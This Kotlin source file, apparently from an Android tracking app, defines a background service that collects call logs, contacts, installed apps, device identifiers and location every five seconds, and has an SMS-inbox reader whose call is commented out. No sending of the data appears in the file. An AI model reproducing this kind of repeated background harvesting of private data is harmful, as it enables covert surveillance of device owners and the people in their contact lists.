package com.wahyu.trackapp

import android.Manifest
import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.gson.Gson
import kotlinx.coroutines.*
import java.util.*


class AppService : Service() {

    private val TAG: String = "AppService"
    private lateinit var fusedLocationClient: FusedLocationProviderClient

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "--> Service Started")
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        Timer().schedule(object : TimerTask() {
            override fun run() {
                Log.d(TAG, "todo for hit background service repeat")
                makeModel()
            }
        },0, 5000L)


        return super.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        Log.d(TAG, "onDestroy")
        Log.d(TAG, "--> AppService Destroyed")
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    private fun makeModel() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }
        fusedLocationClient.lastLocation
            .addOnSuccessListener {
                Log.d(TAG, "location --> ${Gson().toJson(it)}")
            }

//        val smsLogs = getSMSLogs()
        val location = "Tangerang"
        val callLogs = Gson().toJson(getCallLogs())
        val listContact = Gson().toJson(getNamePhoneDetails())
        val appsInstalled = Gson().toJson(getAppsInstalled())

        val model = ServiceModel(
            location = location,
            deviceInfo = getSystemDetail(),
            callLogs = callLogs,
            smsLogs = "smsLogs",
            listContact = listContact,
            appsDownloaded = appsInstalled
        )

        Log.d(TAG, "request model ${Gson().toJson(model)}")

    }

    @SuppressLint("HardwareIds")
    private fun getSystemDetail(): String {
        return "Brand: ${Build.BRAND} \n" +
                "DeviceID: ${
                    Settings.Secure.getString(
                        contentResolver,
                        Settings.Secure.ANDROID_ID
                    )
                } \n" +
                "Model: ${Build.MODEL} \n" +
                "ID: ${Build.ID} \n" +
                "SDK: ${Build.VERSION.SDK_INT} \n" +
                "Manufacture: ${Build.MANUFACTURER} \n" +
                "Brand: ${Build.BRAND} \n" +
                "User: ${Build.USER} \n" +
                "Type: ${Build.TYPE} \n" +
                "Base: ${Build.VERSION_CODES.BASE} \n" +
                "Incremental: ${Build.VERSION.INCREMENTAL} \n" +
                "Board: ${Build.BOARD} \n" +
                "Host: ${Build.HOST} \n" +
                "FingerPrint: ${Build.FINGERPRINT} \n" +
                "Version Code: ${Build.VERSION.RELEASE}"
    }

    private fun getCallLogs(): ArrayList<CallLogs> {
        val callLogsBuffer = ArrayList<CallLogs>()
        callLogsBuffer.clear()
        val managedCursor: Cursor? = this.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, null
        )
        val number: Int? = managedCursor?.getColumnIndex(CallLog.Calls.NUMBER)
        val type: Int? = managedCursor?.getColumnIndex(CallLog.Calls.TYPE)
        val date: Int? = managedCursor?.getColumnIndex(CallLog.Calls.DATE)
        val duration: Int? = managedCursor?.getColumnIndex(CallLog.Calls.DURATION)
        while (managedCursor?.moveToNext() == true) {
            val phNumber: String? = number?.let { managedCursor.getString(it) }
            val callType: String? = type?.let { managedCursor.getString(it) }
            val callDate: String? = date?.let { managedCursor.getString(it) }
            val callDayTime = Date(java.lang.Long.valueOf(callDate!!))
            val callDuration: String? = duration?.let { managedCursor.getString(it) }
            var dir: String? = null
            when (callType?.toInt()) {
                CallLog.Calls.OUTGOING_TYPE -> dir = "OUTGOING"
                CallLog.Calls.INCOMING_TYPE -> dir = "INCOMING"
                CallLog.Calls.MISSED_TYPE -> dir = "MISSED"
            }
            callLogsBuffer.add(
                CallLogs(
                    phoneNumber = phNumber,
                    callType = callType,
                    callDate = callDayTime,
                    callDuration = callDuration
                )
            )
        }
        managedCursor?.close()

        Log.d(TAG, "Call Logs --> ${Gson().toJson(callLogsBuffer)}")

        return callLogsBuffer
    }

    private fun getSMSLogs(): String {
        val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        var msgData = ""
        if (cursor!!.moveToFirst()) { // must check the result to prevent exception
            do {
                for (idx in 0 until cursor.columnCount) {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)
                }
                // use msgData
            } while (cursor.moveToNext())
        } else {
            // empty box, no SMS
        }
        Log.d(TAG, "SMS Logs --> $msgData")
        return msgData
    }

    @SuppressLint("Range")
    fun getNamePhoneDetails(): MutableList<Contact> {
        val names = mutableListOf<Contact>()
        val cr = contentResolver
        val cur = cr.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
            null, null, null
        )
        if (cur!!.count > 0) {
            while (cur.moveToNext()) {
                val id =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NAME_RAW_CONTACT_ID))
                val name =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                names.add(Contact(id, name, number))
            }
        }
        Log.d(TAG, "Contact Phone --> ${Gson().toJson(names)}")
        return names
    }

    private fun getAppsInstalled(): MutableList<String> {
        val apps = mutableListOf<String>()
        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)

        for (packageInfo in packages) {
            apps.add(packageInfo.packageName)
        }
        Log.d(TAG, "Apps Installed --> ${Gson().toJson(apps)}")
        return apps
    }


}